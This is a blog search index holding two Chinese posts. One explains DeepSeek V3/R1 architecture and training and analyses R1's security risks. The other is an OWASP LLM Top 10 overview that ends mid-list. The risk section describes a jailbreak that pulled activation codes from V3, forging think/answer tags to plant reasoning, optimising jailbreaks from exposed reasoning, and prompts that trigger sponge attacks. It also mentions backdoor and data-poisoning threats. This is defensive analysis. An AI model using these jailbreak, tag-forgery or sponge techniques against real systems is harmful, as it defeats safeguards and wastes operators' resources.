<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>DeepSeek技术原理解读及模型安全风险分析</title>
    <link href="/2025/02/14/Deepseek-Technical-Principle-Explanation-and-Model-Security-Risk-Assessment/"/>
    <url>/2025/02/14/Deepseek-Technical-Principle-Explanation-and-Model-Security-Risk-Assessment/</url>
    
    <content type="html"><![CDATA[<h1 id="deepseek-v3-r1关键技术分析">DeepSeek V3 &amp;R1关键技术分析</h1><p><strong>主要思路：</strong></p><ul><li>降低训练成本：通过FP8低精度训练、DualPipe双向流水线等</li><li>降低推理成本：优化MoE负载均衡等</li><li>优化训练数据：使用 14.8T 高质量、多样化的token，增加了数学和编程样本的比例，扩大了多语言覆盖范围</li><li>进一步提升效果：多 Token 预测（MTP）、从 DeepSeek-R1中蒸馏推理能力等</li></ul><p><strong>效果：</strong></p><ul><li>在 MMLU、MMLU-Pro、GPQA 等知识性基准测试中，性能与GPT-4o、Claude-3.5-Sonnet 等领先闭源模型相当。</li><li>在 代码和数学 基准测试中，取得了最先进的性能，甚至超越了GPT-4o。</li><li>在 AlpacaEval 2.0 和 Arena-Hard 的开放式评估中表现出色。</li></ul><p><strong>训练成本 ：</strong></p><ul><li>总成本 ：278.8 万 H800 GPU 小时，约 557.6 万美元。</li><li>预训练效率 ：每训练 1 万亿个 token 仅需 18 万 H800 GPU小时，训练过程稳定，无需回滚。</li></ul><p><strong>开源情况：</strong></p><ul><li>技术报告：<ahref="https://github.com/deepseek-ai/DeepSeek-V3/blob/main/DeepSeek_V3.pdf">DeepSeek-V3Technical Report</a></li><li>权重（大小足有671B，FP8精度）：<ahref="https://huggingface.co/deepseek-ai/DeepSeek-V3-Base">deepseek-ai/DeepSeek-V3-Base· Hugging Face</a></li></ul><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/Benchmark-performance-of-DeepSeek-V3.png"alt="Benchmark performance of DeepSeek-V3 and its counterparts" /><figcaption aria-hidden="true">Benchmark performance of DeepSeek-V3 andits counterparts</figcaption></figure><h2 id="核心降成本">核心：降成本</h2><p>模型效果好 训练过程快推理成本低，相比同等性能开源模型训练成本成倍降低</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/Training-costs-of-DeepSeek-V3.png"alt="Training costs of DeepSeek-V3, assuming the rental price of H800 is $2 per GPU hour" /><figcaption aria-hidden="true">Training costs of DeepSeek-V3, assumingthe rental price of H800 is $2 per GPU hour</figcaption></figure><h3 id="模型结构优化">模型结构优化</h3><ol type="1"><li>MLA技术，降低计算过程中的K, V Cache，降低成本。</li><li>DeepSeekMoE，更多专家模型，总共671B参数，激活37B（相当于小模型的激活量），提高推理效率。</li></ol><h3 id="训练优化">训练优化</h3><ol type="1"><li>加入MTP多token预测模块，提高训练效率。</li><li>二阶段上下文长度扩展4K-&gt;32K，32K-&gt;128K。通过在预训练的时候首先去在一个短的上下文上去训练一个基础的一个模型，再经过微调去扩展到一个比较长的一个上下文，减少训练时间。</li><li>自研大模型训练加速框架HAI-LLM，融合多项性能优化工程技巧，在超大规模训练任务中首次使用FP8混合精度提升训练效率</li></ol><h3 id="通信优化">通信优化</h3><ol type="1"><li>DualPipe算法减少bubble</li><li>ALL2ALL通信和计算掩盖</li></ol><h3 id="内存优化">内存优化</h3><ol type="1"><li>重采样RMSNorm和MLA上采样，以算换存</li><li>将EMA权重存储在CPU内存，异步更新</li></ol><h2 id="架构创新">架构创新</h2><p>DeepSeek<strong>在模型主框架上与主流LLM模型并无差异</strong>，主要创新点集中在<strong>Transformer</strong>块。差异点在于：</p><ul><li><strong>提出MLA结构</strong>，改进Attention计算方式，缩小KVCache缓存，提高推理速度。</li><li><strong>提出DeepSeekMoE架构</strong>，激活部分参数，降低推理成本，提高推理速度。</li></ul><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/basic-architecture-of-DeepSeek-V3.png"alt="Illustration of the basic architecture of DeepSeek-V3" /><figcaption aria-hidden="true">Illustration of the basic architecture ofDeepSeek-V3</figcaption></figure><h3 id="multi-head-latent-attention">Multi-Head Latent Attention</h3><blockquote><p>MLA技术：MLA继承自DeepSeekV2的MLA架构，通过将多头注意力的Key和Value映射到低维共享潜在向量空间，实现动态压缩KV缓存，替代传统的逐头存储方式，且并不会导致明显的性能下降。</p></blockquote><ol type="1"><li><p>原始Attention的缺点：</p><ul><li>每次计算Attention时都需要重新计算键值对，导致大量重复计算。</li><li><strong>显著增加计算开销</strong>，降低推理效率。</li></ul></li><li><p>使用KV Cache的原因：</p><ul><li>KVCache用于存储计算Attention时的键值对，<strong>避免重复计算</strong>。</li><li>支持高效的自回归生成，提升推理性能。</li></ul></li><li><p>减少KV Cache的目的：</p><ul><li>在更少的设备上<strong>处理更长的上下文</strong>。</li><li>提升推理速度和吞吐量，<strong>降低推理成本</strong>。</li></ul></li><li><p>KV Cache的挑战：</p><ul><li>KV Cache随输入长度动态增长，可能超出单卡或多卡显存限制。</li><li>跨设备通信带宽较低，影响性能，因此需尽量减少跨设备部署。</li></ul></li></ol><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/kv-cache-optimization.png" /></p><p><strong>为什么降低KV Cache的大小如此重要？</strong></p><p>众所周知，一般情况下LLM的推理都是在GPU上进行，单张GPU的显存是有限的，一部分我们要用来存放模型的参数和前向计算的激活值，这部分依赖于模型的体量，选定模型后它就是个常数；另外一部分我们要用来存放模型的KVCache，这部分不仅依赖于模型的体量，还依赖于模型的输入长度，也就是在推理过程中是动态增长的，当Context长度足够长时，它的大小就会占主导地位，可能超出一张卡甚至一台机（8张卡）的总显存量。</p><p>在GPU上部署模型的原则是：能一张卡部署的，就不要跨多张卡；能一台机部署的，就不要跨多台机。这是因为“卡内通信带宽&gt; 卡间通信带宽 &gt;机间通信带宽”，由于“木桶效应”，模型部署时跨的设备越多，受设备间通信带宽的的“拖累”就越大，事实上即便是单卡H100内SRAM与HBM的带宽已经达到了3TB/s，但对于ShortContext来说这个速度依然还是推理的瓶颈，更不用说更慢的卡间、机间通信了。</p><p>所以，减少KVCache的目的就是要实现在更少的设备上推理更长的Context，或者在相同的Context长度下让推理的batchsize更大，从而实现更快的推理速度或者更大的吞吐总量。当然，最终目的都是为了实现更低的推理成本。</p><p>MLA架构中KV<strong>共享同一个存储张量</strong>，且引入低秩投影，有效减少KVCache（下图中<strong>仅阴影部分需要存储</strong>）。<strong>用计算换存储</strong>，引入额外的计算量，但相比存储消耗，收益更大。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/attn_variants.png" /></p><ul><li><p>MQA代表模型：<ahref="https://arxiv.org/pdf/2204.02311">PaLM</a>、<ahref="https://papers.cool/arxiv/2305.06161">StarCoder</a>、<ahref="https://papers.cool/arxiv/2312.11805">Gemini</a></p></li><li><p>GQA代表模型：LLAMA2,3，Qwen2，ChatGLM</p></li></ul><p>MLA架构：1）分别对Query、Key-Valuepair进行低秩压缩；2）使用RoPE获得位置信息；3）使用MHA计算得到输出。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/Comparison-of-the-KV-cache.png"alt="Comparison of the KV cache per token among different attention mechanisms" /><figcaption aria-hidden="true">Comparison of the KV cache per tokenamong different attention mechanisms</figcaption></figure><p>对DeepSeekv3而言，<spanclass="math inline"><em>n</em><sub><em>h</em></sub> = 128</span>，MLA可以将KVCache降低为 <spanclass="math inline">$\frac{\frac{9}{2}}{2n_h}=1.7\%$</span></p><h3 id="deepseek-moe">DeepSeek MoE</h3><blockquote><p>DeepSeekMoE技术：DeepseekMoE通过<strong>精细分割专家</strong>、<strong>引入共享专家</strong>和<strong>优化路由选择</strong>，解决了传统MoE中<strong>专家知识重叠和负载不均衡</strong>的问题。具体包括：将专家细分为更多小专家以增强知识分解能力，隔离共享专家以捕获通用知识，并通过专家级和设备级平衡损失优化路由选择，避免路由崩溃和计算瓶颈，从而提升模型在处理复杂任务时的效率和准确性。</p></blockquote><ul><li>Dense模型：对所有输入使用<strong>全部参数</strong>进行计算，计算成本高但实现简单。</li><li>MoE模型：通过路由机制动态激活<strong>部分专家网络的参数</strong>进行计算，降低了<strong>计算成本</strong>，同时支持扩展模型规模以提升性能。</li></ul><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/MoE.png" /></p><p><strong>精细分割专家</strong>:</p><ol type="1"><li>增强知识分解能力：细分为多个小专家，使每个专家专注于更细粒度的任务，提升<strong>专家专业化水平</strong>。</li><li>提高组合灵活性：激活专家组合的<strong>灵活性显著增强</strong>，可动态选择更合适的专家组合，<strong>提升任务处理能力</strong>。</li></ol><p><strong>引入共享专家</strong>：</p><ol type="1"><li>学习通用知识：共享专家专门用于<strong>学习通用知识</strong>，避免其他路由专家重复学习通用知识，减少参数冗余。</li><li>提升参数效率：通过隔离共享专家，路由专家可以更专注于<strong>学习独特知识</strong>，提高<strong>模型参数利用效率</strong>。</li></ol><p><strong>优化路由选择</strong>：</p><ol type="1"><li>避免路由崩溃：确保每个专家都能获得足够的训练机会，<strong>避免模型总是选择少数专家而忽略其他专家</strong>。</li><li>缓解计算瓶颈：确保不同设备上的专家负载均衡，避免计算资源浪费和瓶颈问题，提高分布式计算的效率。</li></ol><h2 id="训练方法创新">训练方法创新</h2><h3 id="multi-token-prediction">Multi-Token Prediction</h3><blockquote><p>DeepSeekMTP技术：大语言模型传统上采用单个token预测训练方式，即每次只预测下一个token。DeepSeekV3基于META提出的多token预测方法，进行了改进，采用<strong>链式结构</strong>而非并行结构，同时保持完整的因果链。这种改进既保留了多token预测的优势，又通过维持因果关系来提升预测质量。不仅提升了模型性能，还<strong>改善了模型的泛化能力</strong>。</p></blockquote><p><strong>传统大模型采用自回归方式逐token预测</strong>:</p><ul><li><strong>训练效率低</strong>：每次在生成一个token的时候，都要频繁跟访存交互，加载KV-Cache，再通过多层网络做完整的前向计算。对于这样的访存密集型的任务，通常会因为访存效率形成训练或推理的瓶颈。</li><li><strong>长文本建模能力弱</strong>：一次只学习单个token，上下文依赖弱，容易陷入局部最优解。</li></ul><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/GPT.png" /></p><p><strong>DeepSeek V3 MTP</strong>:</p><ul><li>主网络结构中<strong>接入2个预测头</strong>，针对输入token <spanclass="math inline"><em>t</em><sub><em>i</em></sub></span>分别预估后续的<spanclass="math inline"><em>t</em><sub><em>i</em> + 1</sub></span>， <spanclass="math inline"><em>t</em><sub><em>i</em> + 2</sub></span></li><li>预测头之间是<strong>串行架构</strong>，预测第 <spanclass="math inline"><em>i</em> + 2</span> 个token时，会把第 <spanclass="math inline"><em>i</em> + 1</span>个token也作为输入，保证完整的序列推理链实现串行预测</li><li>一次预测多个token，有效提升训练性能，次token的接受率稳定在85%＋，<strong>训练时推理</strong>速度提升1.8倍</li><li>共享Embedding层和输出头<strong>减少内存开销</strong></li><li>MTP能够增强有监督训练信号，帮助模型预先规划对于token的组织和表达，提高<strong>泛化</strong>能力</li></ul><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/MTP.png"alt="Illustration of our Multi-Token Prediction (MTP) implementation" /><figcaption aria-hidden="true">Illustration of our Multi-TokenPrediction (MTP) implementation</figcaption></figure><h3 id="dualpipe-and-computation-communication-overlap">DualPipe andComputation-Communication Overlap</h3><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/pipeline-parallelism-from-colossal-ai.png" /></p><p><strong>当前问题</strong></p><p>当模型规模特别大时，通常需要将其拆分为多个子模块，并分配到多个计算设备上进行并行计算。在此过程中，设备之间需要进行数据通信。当一个设备完成其计算任务后，必须将结果传输给下一个设备，以便后续计算任务能够继续执行。然而，这种数据通信过程会导致<strong>部分设备处于空闲状态</strong>，从而造成计算<strong>资源的浪费</strong>。</p><p><strong>DeepSeek解决方案</strong></p><ol type="1"><li><strong>更细分工</strong>：DualPipe把每个GPU的任务分得更细，比如让一个GPU同时负责模型的开头和结尾部分。这样，GPU之间可以同时干活，不用总是等着别人。</li><li><strong>双向流水线</strong>：普通的流水线是单向的，比如数据从GPU1传到GPU 2，再传到GPU 3。DualPipe让数据从两头同时传，比如GPU 1和GPU8同时开始干活，这样中间的GPU也能更忙起来，减少了等待时间。</li><li><strong>优化通信</strong>：DualPipe还改进了GPU之间的通信方式，让数据传输更快，减少了通信占用的时间。</li></ol><h3 id="fp8混合精度训练">FP8混合精度训练</h3><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/FP8.png"alt="The overall mixed precision framework with FP8 data format" /><figcaption aria-hidden="true">The overall mixed precision frameworkwith FP8 data format</figcaption></figure><table><thead><tr><th>格式</th><th>位数</th><th>精度</th><th>动态范围</th><th>计算速度</th><th>内存占用</th><th>适用场景</th></tr></thead><tbody><tr><td>FP32</td><td>32 位</td><td>高精度</td><td>非常大</td><td>慢</td><td>大</td><td>传统高精度计算 (如科学计算)</td></tr><tr><td>BF16</td><td>16 位</td><td>中等精度</td><td>较大</td><td>较快</td><td>中等</td><td>深度学习训练 (兼顾精度和效率)</td></tr><tr><td>FP8</td><td>8 位</td><td>低精度</td><td>较小</td><td>非常快</td><td>小</td><td>低精度训练 (追求极致效率)</td></tr></tbody></table><p><strong>当前问题</strong></p><p>训练大模型太贵了！FP8低精度训练可以大幅减少计算和内存开销，但直接使用FP8 会导致数值不稳定，模型训练可能失败。因此，需要找到一种方法，既能享受FP8 的高效，又能避免它的缺点。</p><p><strong>DeepSeek解决方案</strong></p><ol type="1"><li><strong>精度解耦</strong>：把模型的不同部分分开处理，对不敏感的部分用FP8，对敏感的部分保持高精度（如 BF16 或 FP32）。</li><li><strong>自动缩放</strong>：动态调整数据的缩放比例，确保数值在 FP8的范围内，避免溢出或精度丢失。</li><li><strong>细粒度量化</strong>：对数据进行分组缩放，比如每 128个通道一组，既保证精度又提高效率。</li><li><strong>递增累加精度</strong>：在计算过程中，先用 FP8快速计算，隔一段时间再用高精度（FP32）累加结果，减少误差积累。</li></ol><h2 id="deepseek-r1训练过程">DeepSeek R1训练过程</h2><p>DeepSeek-R1 在<strong>推理任务</strong>上实现了与 OpenAI-o1-1217相当的性能。 DeepSeek-R1以 <strong>DeepSeek-V3-Base(671B)</strong>为基础模型，使用<strong>GRPO算法</strong>作为RL框架来提升Reasoning性能。开源发布了6个基于<strong>DeepSeek-R1</strong>蒸馏的更小稠密模型（Qwen/Llama 1.5B, 7B, 8B, 14B, 32B, 70 ）</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/deepseek-r1-performance.png" /></p><p>DeepSeek V3, R1和R1-Zero区别：</p><ul><li>R1-Zero 基于 DeepSeek-V3-Base，通过 RL （强化学习） 训练，无 STF（监督微调），具备AI自我进化范式。</li><li>R1 则基于R1-Zero，增加STF（监督微调），先利用少量人工标注的高质量数据进行冷启动微调，再进行RL。</li></ul><p>关键技术点：</p><ol type="1"><li>DeepSeek-R1-Zero直接基于V3Base做RL，不依赖SFT初始化，模型依然能自己学习到推理能力。</li><li>奖励模型是基于规则的，Accuracy rewards（答案的正确性）和Formatrewards（强制思考过程在<code>&lt;think&gt;&lt;/think&gt;</code>之间）</li><li>提出了一种提高模型推理能力的训练流程，可生成高质量推理数据。</li></ol><h3 id="deepseek-r1-zero">DeepSeek R1-Zero</h3><blockquote><p>DeepSeek R1-Zero 训练核心思路：1. 不做监督微调 2.强化学习中放弃过程性奖励，直接根据最终结果及输出格式作为奖励函数</p></blockquote><pre><code class="mermaid" >flowchart LR    A["DeepSeek-V3-Base"] --> B["强化学习（GRPO）<br>规则奖励函数"]    B --> C["DeepSeek-R1-Zero"]</code></pre><ul><li>正确性奖励：评估response是否正确（数学，代码，逻辑）<br />比如带有确定结果的数学问题，模型需要提供指定格式的最终答案，来增强基于规格的判别正确性。比如对于leedcode问题，针对预设的测试用例可以通过编译器生成反馈信号。</li><li>格式奖励：评估输出格式是否符合要求<br />另外还采用了基于格式的奖励，强制模型将思考过程放在<code>&lt;think&gt; &lt;/think&gt;</code>标签之间。</li></ul><p>训练模板：推理过程和答案包裹在标签里面的形式<code>&lt;think&gt; reasoning process here &lt;/think&gt;&lt;answer&gt; answer here &lt;/answer&gt;</code></p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/DeepSeek-R1-Zero.png"alt="Template for DeepSeek-R1-Zero" /><figcaption aria-hidden="true">Template forDeepSeek-R1-Zero</figcaption></figure><p>随着RL的训练进行，模型的输出逐渐变长，逐渐学习推理能力 <img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/DeepSeek-R1-Zero-RL.png"alt="The average response length of DeepSeek-R1-Zero on the training set during the RL process." /></p><p>最终结果：推理能力提升，但回答<strong>格式混乱、语言混杂</strong></p><h3 id="deepseek-r1">DeepSeek R1</h3><blockquote><p>DeepSeek R1训练核心思路：1.通过SFT+RL等训练方式获得可用模型构造高质量数据集 2.利用高质量数据集遵照V3训练pipeline对V3base模型做SFT和RL训练，得到R1模型。</p></blockquote><p>DeepSeek-R1训练过程分为<strong>两阶段四个步骤</strong>，目标：</p><ol type="1"><li>通过少量高质量数据作为冷启动，提升推理能力和加速收敛</li><li>训练一个用户友好的模型，使其产生清晰连贯的思维链CoT，还能表现出强大的通用能力</li></ol><h4id="第一阶段训练出一个可用模型生成高质量数据集">第一阶段：训练出一个可用模型生成高质量数据集</h4><h5 id="冷启动sft约几千条">冷启动SFT（约几千条）</h5><p><strong>数据集</strong>：</p><ul><li>Few-shot：带有long cot的例子作为fewshot，引导模型生成回答。（V3-Base）</li><li>Zero-shot：直接在prompt中要求模型输出带有思维链的回答。（V3-Base）</li><li>部分DeepSeek-R1-Zero输出</li><li>人工做后处理完善结果</li></ul><p><strong>数据格式</strong>：</p><ul><li>&lt;问题，思考过程，回答&gt;</li></ul><p><strong>微调</strong>：以DeepSeek-V3-Base为基础模型微调</p><p><strong>目的</strong>：训练一个指令性遵从较好的模型。</p><p><strong>模型</strong>：<strong>DeepSeek-R1-SFT-1</strong></p><h5 id="强化学习">强化学习</h5><p><strong>数据集（同R1-Zero）</strong>：</p><ul><li>Math, Code,逻辑推理等…</li></ul><p><strong>数据格式</strong>：</p><ul><li>&lt;问题，回答&gt;</li></ul><p>数据集数量未知</p><p><strong>基于GRPO算法的RL训练</strong>:</p><ul><li>训练奖励函数同R1-Zero一致</li></ul><p>提高模型在具有明确解决方案的问题中的推理能力。</p><p>目的：学习推理能力，训练具有一定推理能力的模型，用于<strong>自动化大规模</strong>生成最终训练的数据集。</p><p>模型：<strong>DeepSeek-R1-RL-1</strong></p><h4id="第二阶段使用第一阶段高质量数据常规rl训练得到r1模型">第二阶段：使用第一阶段高质量数据+常规RL训练，得到R1模型</h4><h5 id="拒绝采样sft">拒绝采样+SFT</h5><p><strong>收集SFT数据</strong>：只包含问题，不包含答案。</p><p><strong>推理数据</strong>：基于前一阶段 DeepSeek-R1-RL-1执行拒绝采样生成推理轨迹。每个提示采样多个响应，并保留正确的响应，共收集600K训练样本</p><p><strong>非推理数据</strong>：复用 DeepSeek-V3 的 SFT数据集的一部分，共收集200K。</p><p>在 DeepSeek-V3 base 模型上用800K样本做 2epoch SFT 训练。</p><p>目的：这个阶段的模型主要是解决 R1-Zero存在的可读性差和语言混乱的问题。</p><p>模型：<strong>DeepSeek-R1-SFT-2</strong></p><h5 id="全场景强化学习">全场景强化学习</h5><p>目的：这个阶段的RL训练主要是提高模型推理能力。以及进一步对齐人类偏好，提高模型的有用性和无害性。训练过程同V3一致。</p><p>模型：<strong>DeepSeek-R1</strong></p><h2id="simple-test-time-scaling-1000条sft数据微调实现o1-like推理">Simpletest-time scaling: 1000条SFT数据微调实现O1-like推理</h2><p><strong>核心概念</strong>:</p><p>Test-timeScaling是一种在模型推理阶段利用额外计算资源提升性能的技术，其核心思想是通过引入更多计算或复杂策略，使模型在生成答案时<strong>进行更深入的思考或多次验证</strong>，从而提高输出的准确性和可靠性。</p><p><strong>核心贡献</strong>:</p><ol type="1"><li>提出了一种非常简单的Test-time Scaling方式， <strong>BudgetForcing</strong><ul><li><strong>强制结束</strong>：若超过最大token数量，强制结束思考过程，并输出答案。</li><li><strong>延长思考</strong>：若提前结束思考，则添加<code>Wait token</code> 来鼓励模型进行更多的探索。</li></ul></li><li>构建高质量小规模数据集微调模型，验证方法有效性。</li></ol><p><strong>启发</strong>：</p><ol type="1"><li>大部分模型都有更强的推理潜力，需要被激活</li><li>训练数据质量比数量更重要</li></ol><h2 id="总结">总结</h2><ol type="1"><li>高质量数据对提升模型推理能力至关重要。通过蒸馏大模型数据<strong>构建高质量数据集</strong>，是提升小模型性能的最有效方法之一。</li><li>当前LLM普遍具备更强的潜在推理能力，可通过<strong>Test timeScaling</strong>技术激发。</li><li>模型<strong>内生安全</strong>能力的提升可能<strong>仍需依赖SFT</strong>，因为RL仅在具有明确结果和规则的数据集上表现出良好的推理能力，而内生安全对逻辑性的要求可能相对较低。<ul><li><em>数学、代码等数据，具有高度结构化和明确的逻辑规则，结果通常是确定性的，可以通过形式化方法进行验证。</em></li><li><em>内容安全数据，通常是开放域的、非结构化的（如文本、图像、语音）。涉及主观判断（例如，什么是“有害内容”可能因文化、语境而异）。</em></li></ul></li><li>模型能力越强可能越容易遭受攻击，如海绵样本、越狱等。攻击者还可能通过控制思维过程来操纵模型输出。</li></ol><h1 id="r1模型安全风险分析">R1模型安全风险分析</h1><h2 id="模型安全后门">模型安全（后门）</h2><p>模型安全可使用业界SOTA的<strong>LLM模型后门检测工具BAIT</strong>（发表于S&amp;P2025）进行测试，使用DeepSeek-R1生成的推理数据训练出的系列模型暂未发现植入的模型后门。</p><h2 id="生成内容安全越狱隐私">生成内容安全（越狱、隐私）</h2><h3 id="思维链chain-of-thought-cot">思维链/Chain-of Thought (CoT)</h3><p>R1的慢推理其实是思维链发展来的，目前<strong>LLM普遍可以生成思维链</strong>，但<strong>不会主动触发</strong>。需要提示词触发模型生成思维链，思维链内容作为有效信息引导模型给出正确回答。<img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/zCoT.png" /></p><ul><li>CoT的应用（zero-shot or fewshot）：提升模型在特定问题上回答的<strong>准确性、规范性，数据生成</strong>等；突破模型安全边界，利用模板、违规问答等方式<strong>诱导模型输出有害内容</strong>。</li><li>CoT的不足：1）用户需要根据问题去<strong>设计prompt</strong>以引导大模型进行reasoning；2）reasoning过程<strong>严重依赖于输入的prompt的优劣</strong>。</li></ul><p>DeepSeek-R1的“慢思考”、Reasoning可以有效提升<strong>内生安全防护</strong>，但<strong>开辟了另外的攻击面</strong></p><h3 id="慢思考有效提升内生安全防护">慢思考有效提升内生安全防护</h3><p>DeepSeek-R1在思维链中可<strong>主动意识</strong>到要保护隐私数据，通过慢思考提醒自己，答案中涉及的隐私信息必须是<strong>随机生成、虚构、测试数据</strong></p><ul><li>能意识到和敏感信息相关的数据应当是“虚构的”“测试数据”</li><li>针对用户对敏感信息的询问，能意识到要“随机生成”答案</li><li>甚至可能意识到“<strong>用户正在测试我是否存在漏洞</strong>”</li></ul><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/r1-security-1.png" /></p><p>DeepSeek-R1在reasoning过程中<strong>对用户的合理需求以及非法需求分别进行了分析</strong>，并得出结论：要在安慰用户的同时不提供非法信息</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/r1-security-2.png" /></p><p>对比DeepSeek-V3被越狱成功输出真实的激活码</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/r1-security-3.png" /></p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/r1-security-4.png" /></p><p>但是<strong>慢思考不能完全避免有害回答</strong>，可能出现在思维链中<strong>明确意识到</strong>要避免有害回答，但答案中依然<strong>出现有害回答</strong>。</p><p><strong>根本原因</strong>：<strong>Faithfulness（幻觉的一种）不足</strong>，即没有完全依据思维链生成回答。</p><p><strong>结论：慢思考有助于避免有害回答，但不完全可靠，风控依然是必要的。</strong></p><h3 id="慢思考开辟了另外的攻击面">慢思考开辟了另外的攻击面</h3><p>DeepSeek-R1在思维链用了<code>&lt;think&gt;&lt;answer&gt;</code>等标签，存在标签伪造风险，可植入思考过程、历史答案</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/r1-security-5.png" /></p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/r1-security-6.png" /></p><p>需要警惕提示词中标签的来源，避免思维链伪造,有更多潜在的不安全标签，引入的风险待探索。</p><h2id="应用安全智能体劫持海绵样本">应用安全（智能体劫持、海绵样本）</h2><p>同时暴露思维链让对抗变更容易，暴露思维链 = 暴露大模型的思考思路 -&gt;让对抗（越狱、劫持）更<strong>有的放矢</strong>。根本原因是反馈信息从“劫持成功与否”这个二元的反馈变成了整个推理过程，具备了更多信息。</p><p>例如在<a href="https://arxiv.org/pdf/2312.02119">Tree of Attacks:Jailbreaking Black-Box LLMs Automatically</a> 中就介绍了TAP:一种迭代式越狱话术优化方法。同时在Cisco测试报告（<ahref="https://blogs.cisco.com/security/evaluating-security-risk-in-deepseek-and-other-frontier-reasoning-models">EvaluatingSecurity Risk in DeepSeek and Other Frontier ReasoningModels</a>)中表示基于R1反馈信息优化越狱话术，可实现100%攻击成功率。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/r1-security-7.png" /></p><p>此外，DeepSeek在RL训练中放任思维链变长，更容易触发<strong>海绵样本</strong>：</p><ul><li>方式1：“写出尽可能多的xxx”</li><li>方式2：稍微有点复杂的数学问题</li><li>方式3：解释一个矛盾的命题</li></ul><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DeepSeek/r1-security-8.png" /></p><p>大模型易被上文distract，不相干的reasoning内容反倒会削弱模型能力；reasoning过程易陷入死循环、发散时较难停止，因此更容易遭受海绵攻击。</p>]]></content>
    
    
    <categories>
      
      <category>LLM Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LLM Security</tag>
      
      <tag>Threat Analysis</tag>
      
      <tag>Model Safety</tag>
      
      <tag>DeepSeek</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AI安全风险洞察：2024</title>
    <link href="/2024/12/18/AI-Insights-2024/"/>
    <url>/2024/12/18/AI-Insights-2024/</url>
    
    <content type="html"><![CDATA[<h1 id="威胁分析模型">威胁分析模型</h1><p>近年来，人工智能技术在各个行业的应用迅速扩展，特别是在自然语言处理、机器学习和自动化决策等领域，AI已成为推动社会进步和技术创新的重要力量。无论是在金融、医疗、教育，还是在自动驾驶和智能客服等场景中，AI的应用无处不在。然而，随着AI系统的广泛应用，其潜在的安全隐患也逐渐暴露，如何确保AI系统的安全性，成为全球关注的关键问题。从数据隐私泄露、算法偏见到模型滥用和对抗性攻击，AI安全问题日益复杂且具有广泛影响，涉及到技术、伦理以及法律等多个层面。因此，AI系统的安全性不仅关乎技术的可持续发展，也直接影响到用户的信任和社会的稳定。</p><p>OWASP组织梳理LLM大模型的Top攻击场景，对10类风险场景识别安全威胁风险：</p><blockquote><p><ahref="https://genai.owasp.org/resource/owasp-top-10-for-llm-applications-2025/">OWASPTop 10 for LLM Applications 2025</a></p></blockquote><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AI2024/LLMThreatModeling.png"alt="LLM Application Architecture and Threat Modeling" /><figcaption aria-hidden="true">LLM Application Architecture and ThreatModeling</figcaption></figure><h2 id="llm安全威胁识别">LLM安全威胁识别</h2><ul><li><p><strong>LLM01: 提示注入 (Prompt Injection)</strong></p><p>利用精心构造的输入，操纵大语言模型，导致意想不到的操作。<strong>直接注入</strong>会覆盖系统提示，而<strong>间接注入</strong>则会操纵来自外部的输入。<strong>Prompt攻击</strong>正是这种威胁的典型表现。</p></li><li><p><strong>LLM02: 不安全的输出处理 (Insecure OutputHandling)</strong></p><p>当下游组件<strong>未经适当审查而盲目接受大型语言模型（LLM）输出</strong>时产生的漏洞。此漏洞会导致XSS、CSRF、SSRF、权限提升、远程代码执行等严重后果。</p></li><li><p><strong>LLM03: 训练数据污染 (Training DataPoisoning)</strong></p><p>当LLM训练数据被篡改，引入漏洞或偏差，危及安全性、有效性或道德行为时，就会发生被<strong>数据投毒</strong>的风险。</p></li><li><p><strong>LLM040.: 模型拒绝服务 